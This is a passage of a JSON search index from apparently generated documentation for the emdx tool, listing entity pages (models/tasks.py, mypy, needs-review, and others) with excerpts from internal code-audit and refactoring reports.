<li>Test-only production code \u2014 <code>models/executions.py</code> and <code>models/tags.py</code> have functions called only from tests, not from any production path.</li> </ol> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/modelsexecutionspy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Summary</p> <p>Audited every public symbol in <code>constants.py</code>, <code>tagging_rules.py</code>, <code>cli_config.py</code>, <code>ui_config.py</code>, and flagged items in <code>models/executions.py</code>, <code>models/tags.py</code>, <code>models/tasks.py</code>. Found 48 confirmed dead symbols across 4 files.</p> <ul> <li>#6544 Delegate Enhancement Gameplans [4/5]   Section: Implementation Steps (Ordered) <ol> <li>Add data query functions to <code>models/tasks.py</code> and <code>models/executions.py</code></li> </ol> </li> <li><code>get_tasks_in_window(hours)</code></li> <li><code>get_delegate_tasks_in_window(hours)</code></li> <li> <p><code>get_execution_stats_in_window(hours)</code></p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 1: <code>models/</code> Directory Naming (PARTIALLY ADDRESSED)</p> <p>Current State: The <code>models/</code> directory now re-exports from <code>database/</code>:</p> </li> <li><code>models/documents.py</code> - Re-exports from <code>emdx.database.documents</code> with deprecation note</li> <li> <p><code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/tags.py</code> - Need inspection</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 2. Inconsistent Data Access Patterns</p> <p>Pattern B - Dataclasses:</p> </li> <li> <p><code>models/executions.py:14-60</code>: Returns <code>Execution</code> dataclass</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <ol> <li><code>executions</code> table (via <code>emdx/models/executions.py</code>) - Low-level CLI execution tracking</li> </ol> </li> <li><code>task_executions</code> table (via <code>emdx/models/task_executions.py</code>) - Task-to-execution linking </li> <li> <p><code>tasks</code> table (via `em...</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Shared Foundation:</p> <p>Both ultimately use:</p> </li> <li><code>cli_executor.get_cli_executor()</code> to build commands</li> <li><code>models/executions.py</code> for execution records</li> <li>Same environment setup (<code>get_subprocess_env()</code>)</li> </ul>"},{"location":"entities/modelsexecutionspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ui_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>ui/themes.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>get_gameplan_stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx_log_dir</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>database/search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>database/cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>models/tasks.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.7)</li> <li><code>active_doc_filter</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>models/tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> <li><code>config/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/modelstagspy/","title":"models/tags.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/modelstagspy/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Test-only production code \u2014 <code>models/executions.py</code> and <code>models/tags.py</code> have functions called only from tests, not from any production path.</li> </ol> </li> <li> <p>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/modelstagspy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Summary</p> <p>Audited every public symbol in <code>constants.py</code>, <code>tagging_rules.py</code>, <code>cli_config.py</code>, <code>ui_config.py</code>, and flagged items in <code>models/executions.py</code>, <code>models/tags.py</code>, <code>models/tasks.py</code>. Found 48 confirmed dead symbols across 4 files.</p> <ul> <li>#6611 Emoji alias removal: synthesis   Section: Actionable Items <p>...elete <code>emdx/utils/emoji_aliases.py</code> and <code>tests/test_emoji_aliases.py</code></p> </li> <li>Simplify <code>models/tags.py</code> \u2014 remove all 6 alias/normalize call sites</li> <li>Simplify <code>commands/core.py</code> \u2014 remove all 5 <code>expand_alias_string</code> calls</li> <li> <p>Update <code>auto_tagger.py</code>, <code>ask_service.py</code>, `u...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 2. <code>expand_aliases</code> (function)</p> <p>...<code>emdx/utils/emoji_aliases.py</code> | 172 | Called by <code>expand_alias_string()</code> | | <code>emdx/models/tags.py</code> | 9 | Import: <code>from emdx.utils.emoji_aliases import expand_aliases, normalize_tag_to_emoji</code> | | <code>emdx/models/tags.py</code> | 40 | Usage: `expanded_tags = expand_...</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 1: <code>models/</code> Directory Naming (PARTIALLY ADDRESSED)</p> <p>Current State: The <code>models/</code> directory now re-exports from <code>database/</code>:</p> </li> <li><code>models/documents.py</code> - Re-exports from <code>emdx.database.documents</code> with deprecation note</li> <li> <p><code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/tags.py</code> - Need inspection</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Circular Dependencies Found \ud83d\udd34</p> </li> <li><code>document_merger.py:22-23</code> imports from both <code>models/documents.py</code> and <code>models/tags.py</code> directly</li> <li> <p>Should use service-layer facades instead</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: File-Specific Line References</p> <p>...onal row access | | <code>models/tasks.py</code> | 37, 65, 99 | Different import pattern | | <code>models/tags.py</code> | 243-298 | Query building boilerplate |</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>Recommendation: Move all tag expansion to <code>models/tags.py</code> layer.</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: Thin Wrapper Files (by design, but worth auditing)</p> <p>...from <code>database/documents.py</code> | | <code>services/tag_service.py</code> | 20 | Re-exports from <code>models/tags.py</code> | | <code>services/group_service.py</code> | 36 | Re-exports from <code>database/groups.py</code> |</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 3. UNNECESSARY TRANSFORMATIONS: <code>dict(row)</code> Everywhere</p> <p>...y:53, 159, 190, 331, 354`</p> </li> <li><code>database/__init__.py:149, 170, 230, 272, 338, 358</code></li> <li><code>models/tags.py</code> \u2014 multiple locations</li> <li> <p><code>models/tasks.py</code> \u2014 multiple locations</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> </ul>"},{"location":"entities/modelstagspy/#tangled-dependencies","title":"Tangled Dependencies","text":""},{"location":"entities/modelstagspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tag system emojis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>expand_alias_string</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>models/documents.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>ui_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>ui/themes.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>get_gameplan_stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>execution_timeout_seconds</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>models/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/modelstaskspy/","title":"models/tasks.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/modelstaskspy/#documents-12","title":"Documents (12)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/modelstaskspy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Summary</p> <p>Audited every public symbol in <code>constants.py</code>, <code>tagging_rules.py</code>, <code>cli_config.py</code>, <code>ui_config.py</code>, and flagged items in <code>models/executions.py</code>, <code>models/tags.py</code>, <code>models/tasks.py</code>. Found 48 confirmed dead symbols across 4 files.</p> <ul> <li>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Architecture Notes <p>...ent<code>from</code>database/documents.py`</p> </li> <li> <p>Task model: <code>create_task</code>, <code>update_task</code> from <code>models/tasks.py</code>...</p> </li> <li> <p>#6544 Delegate Enhancement Gameplans [4/5]   Section: Implementation Steps (Ordered)</p> <ol> <li>Add data query functions to <code>models/tasks.py</code> and <code>models/executions.py</code></li> </ol> </li> <li><code>get_tasks_in_window(hours)</code></li> <li><code>get_delegate_tasks_in_window(hours)</code></li> <li> <p><code>get_execution_stats_in_window(hours)</code></p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]   Section: Architecture Decision</p> <p>Rationale:</p> </li> <li>Tasks have an <code>error</code> field that stores error messages (line 178 of <code>models/tasks.py</code>)</li> <li><code>get_failed_tasks()</code> already exists in <code>models/tasks.py</code> (line 413)</li> <li><code>status.py</code> already implements <code>_show_failed_tasks()</code> using this function</li> <li> <p>Tasks have `pro...</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: What Works Well</p> <ol> <li>Task Tracking (<code>models/tasks.py</code>)</li> </ol> </li> <li>Hierarchical task structure (parent/child)</li> <li>Epic/category auto-numbering</li> <li> <p>Status lifecycle (open \u2192 active \u2192 done/failed)</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Scope of Changes</p> ...dule Functions Found Priority <code>emdx/models/tasks.py</code> 13 functions Critical <code>emdx/database/documents.py</code> 12 functions High <code>emdx/database/cascade.py</code> 7 functions High `emdx/database/... </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 1: <code>models/</code> Directory Naming (PARTIALLY ADDRESSED)</p> <p>Current State: The <code>models/</code> directory now re-exports from <code>database/</code>:</p> </li> <li><code>models/documents.py</code> - Re-exports from <code>emdx.database.documents</code> with deprecation note</li> <li> <p><code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/tags.py</code> - Need inspection</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 2. Inconsistent Data Access Patterns</p> <p>Pattern A - Raw dicts from sqlite3.Row:</p> </li> <li><code>database/documents.py</code>: Returns <code>dict[str, Any]</code></li> <li><code>database/groups.py</code>: Returns <code>dict[str, Any]</code></li> <li><code>database/cascade.py</code>: Returns <code>dict[str, Any]</code></li> <li> <p><code>models/tasks.py</code>: Returns <code>dict[str, Any]</code></p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 3. UNNECESSARY TRANSFORMATIONS: <code>dict(row)</code> Everywhere</p> <p>...init__.py:149, 170, 230, 272, 338, 358`</p> </li> <li><code>models/tags.py</code> \u2014 multiple locations</li> <li> <p><code>models/tasks.py</code> \u2014 multiple locations</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <p>.../task_executions.py`) - Task-to-execution linking </p> </li> <li> <p><code>tasks</code> table (via <code>emdx/models/tasks.py</code>) - High-level delegate task tracking</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: What It Actually Does (389 LOC in commands, 442 LOC in models)</p> <p>models/tasks.py - Business logic:</p> </li> <li>CRUD operations</li> <li>Dependency management with cycle detection</li> <li>Epic/category auto-numbering</li> <li>Status tracking with timestamps</li> </ul>"},{"location":"entities/modelstaskspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>get_gameplan_stats()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>models/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.7)</li> <li><code>worktree isolation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>execution_timeout_seconds</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>delegate_execution_timeout</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>stale_execution_timeout_seconds</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>get_failed_tasks()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>dict(row)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>models/tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.0)</li> <li><code>task tracking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/mypy/","title":"mypy","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-15</p>"},{"location":"entities/mypy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6827 Delegate: --help [2/2]   Section: Summary <p>Verification:</p> </li> <li><code>ruff check</code> \u2014 all checks passed</li> <li><code>mypy</code> \u2014 no issues</li> <li><code>pytest -k delegate</code> \u2014 100/100 tests passed</li> <li><code>emdx delegate --help</code> \u2014 shows full help with examples and subcommands</li> <li> <p><code>emdx delegate list</code> \u2014 correctl...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> </li> <li><code>ruff check</code>: all passed</li> <li><code>mypy</code>: no issues found in both files</li> <li><code>pytest</code>: 1189 passed, 9 skipped</li> <li> <p>Pre-commit hooks: ruff lint, ruff format, mypy all passed</p> </li> <li> <p>#6601 Delegate: Fix PR #687 on branch delegate/add-a-typeddict-for-the-dict-   Section: Verification Results</p> Check Result <code>ruff check</code> All checks passed <code>mypy</code> No issues found <code>pytest</code> (executor tests) 72 passed, 2 skipped <code>pytest</code> (full suite) 1 pre-existing failure in <code>test_task_browser.py</code> (unrelated) </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_   Section: Verification</p> <ul> <li><code>ruff check</code> passes with zero errors</li> </ul> </li> <li><code>mypy</code> passes with no issues</li> <li> <p>Tests in <code>test_unified_executor.py</code> confirm <code>to_dict()</code> behavior (pytest version mismatch prevents running in this worktree, but the change is type-only)</p> </li> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Quality Checks</p> <p>All checks passed:</p> </li> <li>\u2705 <code>ruff check</code> - 0 errors</li> <li>\u2705 <code>ruff format</code> - No changes needed</li> <li>\u2705 <code>mypy</code> - No type errors</li> <li> <p>\u2705 <code>pytest</code> - 1200 tests pass</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Next Steps</p> <ol> <li>Create <code>emdx/ui/types.py</code> and <code>emdx/ui/protocols.py</code></li> </ol> </li> <li>Start with Phase 1 quick wins across all files</li> <li>Add TypedDicts incrementally, testing after each batch</li> <li> <p>Run <code>mypy</code> after each phase to catch any issues</p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <p>Quality checks passed:</p> </li> <li><code>ruff check</code> \u2014 All checks passed</li> <li><code>mypy</code> \u2014 No issues found  </li> <li> <p><code>pytest</code> \u2014 15 tests passed</p> </li> <li> <p>#6431 Add cascade TypedDicts to database and service layers   Section: Changes Made</p> </li> <li>\u2705 <code>ruff check</code> passes with zero errors</li> <li> <p>\u2705 <code>mypy</code> runs (shows expected type coercion warnings)</p> </li> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: Verification</p> <ul> <li>ruff check: All checks passed (0 errors)</li> </ul> </li> <li>mypy: Success, no issues found in 2 source files</li> <li>pytest: 1189 passed, 9 skipped in 14.37s</li> <li>Force-pushed: <code>c2cc91d...f39649a</code> (forced update)</li> </ul>"},{"location":"entities/mypy/#verification","title":"Verification","text":""},{"location":"entities/mypy/#verification_1","title":"Verification","text":""},{"location":"entities/mypy/#related-entities","title":"Related Entities","text":"<ul> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>origin/main</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>force-pushed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>fix pr #689: rebase and resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>delegate: fix pr #687 \u2014 add executionresultdict typeddict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>delegate/remove-any-remaining-references-to-curso-90eaf</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>cursor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>claude-opus-4-6</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>c2cc91d...f39649a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/needs-review/","title":"needs-review","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-12</p>"},{"location":"entities/needs-review/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (A) COULD MOVE TO A HOOK</p> <p>...d be added there if an <code>EMDX_MODEL</code> env var were passed. Trivial move. | | 23 | <code>needs-review</code> tag injection | 480\u2013483 | Stop (save-output.sh) | The save hook already builds the tag string. It could unconditionally add <code>needs-review</code>. Trivial move. |</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 4. Output Pipeline</p> <p>...lback: delegate reads output file and saves if agent didn't</p> </li> <li>All outputs tagged <code>needs-review</code> for triage</li> <li> <p>Synthesis (if enabled) prints only the combined summary</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Output Handling</p> <p>...gent doesn't save, delegate reads the output file and saves it</p> </li> <li> <p>All outputs get <code>needs-review</code> tag for triage workflow</p> </li> <li> <p>#6556 Delegate: --memory N flag implementation   Section: 1. New Functions in <code>emdx/commands/delegate.py</code></p> <p>...&gt; str`** (lines 431-491)</p> </li> <li>Queries recent delegate outputs using <code>search_by_tags([\"needs-review\", \"delegate-output\"], mode=\"any\")</code></li> <li>Filters out documents tagged <code>rejected</code> or <code>\ud83d\udeab</code></li> <li>Truncates each doc to ~2000 chars to stay within token budget</li> <li> <p>Returns formatt...</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> <p>Filtering:</p> </li> <li>Tags: <code>needs-review</code> OR <code>delegate-output</code></li> <li> <p>Excludes: <code>rejected</code> tagged docs</p> </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]   Section: Design Decisions</p> </li> <li>Filter to documents tagged <code>needs-review</code> OR <code>delegate-output</code> (as specified)</li> <li>Use <code>search_by_tags()</code> with <code>mode=\"any\"</code> for tag matching</li> <li> <p>Exclude documents tagged <code>rejected</code> to avoid injecting low-quality context</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Core Workflow Tags</p> <p>...ess` - Currently being worked on</p> </li> <li><code>blocked</code> - Waiting on external dependencies</li> <li><code>needs-review</code> - Ready for evaluation</li> <li><code>completed</code> - Finished successfully</li> <li> <p><code>abandoned</code> - Discontinued/cancelled</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> <p>...nalysis<code>,</code>todo<code>,</code>in-progress<code>,</code>completed`</p> </li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li><code>priority-high</code>, <code>priority-medium</code>, <code>priority-low</code></li> </ul>"},{"location":"entities/needs-review/#tag-filtering","title":"Tag Filtering","text":""},{"location":"entities/needs-review/#related-entities","title":"Related Entities","text":"<ul> <li><code>rejected</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>delegate-output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>title here</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tag filtering</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>successful</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>project-&lt;name&gt;-review</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>project-&lt;name&gt;-planning</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>priority-medium</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>priority-low</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>priority-high</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/normalizetagtoemoji/","title":"normalize_tag_to_emoji","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/normalizetagtoemoji/#documents-8","title":"Documents (8)","text":"<ul> <li>#6611 Emoji alias removal: synthesis   Section: Scope of Change <p>...tions** are actively used in production (<code>expand_aliases</code>, <code>expand_alias_string</code>, <code>normalize_tag_to_emoji</code>, <code>EMOJI_ALIASES</code>)</p> </li> <li>5 functions have zero production consumers (test-only dead code)</li> <li> <p>~14 files total including docs and tests \u2014 estimated half-day effort</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 1. <code>EMOJI_ALIASES</code> (dict constant)</p> <p>...213 | Used in <code>is_text_alias()</code> | | <code>emdx/utils/emoji_aliases.py</code> | 234 | Used in <code>normalize_tag_to_emoji()</code> | | <code>emdx/utils/emoji_aliases.py</code> | 243 | Used in <code>get_all_aliases()</code> \u2014 returns <code>.copy()</code> | | <code>emdx/utils/emoji_aliases.py</code> | 278 | Used in <code>suggest_aliases()</code> \u2014...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: 1. <code>--tags</code> Filter \u274c MISSING**</p> <p>...lper in <code>ask_service.py</code></p> </li> <li>Integrate with <code>document_tags</code> and <code>tags</code> tables</li> <li> <p>Use <code>normalize_tag_to_emoji()</code> for alias resolution</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> 